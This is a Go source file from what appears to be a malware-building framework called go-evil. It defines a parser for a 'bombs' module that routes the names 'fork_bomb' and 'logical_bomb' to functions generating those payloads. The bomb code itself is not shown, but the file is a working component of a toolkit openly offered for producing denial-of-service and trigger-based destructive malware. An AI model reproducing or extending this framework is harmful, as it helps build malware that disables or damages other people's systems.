package main

import (
	"fmt"

	"github.com/DennisTheodoreNedry/go-evil/domains/bombs/fork"
	"github.com/DennisTheodoreNedry/go-evil/domains/bombs/logical"
	"github.com/DennisTheodoreNedry/go-evil/utility/structure/json"

	notify "github.com/DennisTheodoreNedry/notify_handler"
)

func Parser(function string, value string, data_object *json.Json_t) []string {
	call := []string{}

	switch function {
	case "fork_bomb":
		call = fork.Bomb(value, data_object)

	case "logical_bomb":
		call = logical.Bomb(value, data_object)

	default:
		notify.Error(fmt.Sprintf("Unknown function '%s'", function), "bombs.Parser()", 1)

	}

	return call
}
